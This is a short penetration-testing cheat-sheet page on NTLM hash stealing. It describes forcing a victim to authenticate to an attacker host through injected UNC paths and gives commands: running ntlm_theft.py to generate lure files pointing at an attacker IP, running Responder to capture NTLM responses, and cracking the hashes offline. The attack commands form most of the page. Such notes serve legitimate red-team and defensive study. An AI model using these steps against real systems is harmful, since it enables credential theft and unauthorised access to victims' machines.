---
label: NTLM Hash Stealing
---

# NTLM Hash Stealing

The trick is to force victim server to auth attempt with attacker host. [Check out places to steal NT hash](https://hacktricks.boitatech.com.br/windows/ntlm/places-to-steal-ntlm-creds). In general, wherever an [UNC Path](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) can be injected it's possible to have NTLM hash stealing vulnerability.  

The [_ntlm\_theft.py_](https://github.com/Greenwolf/ntlm_theft) script is used to generate multiple files to steal NTLM response. These files can be uploaded wherever it's possible to execute them (e.g. an SMB share).

```bash
# Generate all files
python ntlm_theft.py -s $responder_ip -f $filename -g all
# Upload file and execute it from the victim machine

# Grab all NTLM responses
responder -I $net_interface
```

The captured NT hashes can then be cracked offline. However, these are not the hashes that can be used in a Pass-The-Hash type of attack.
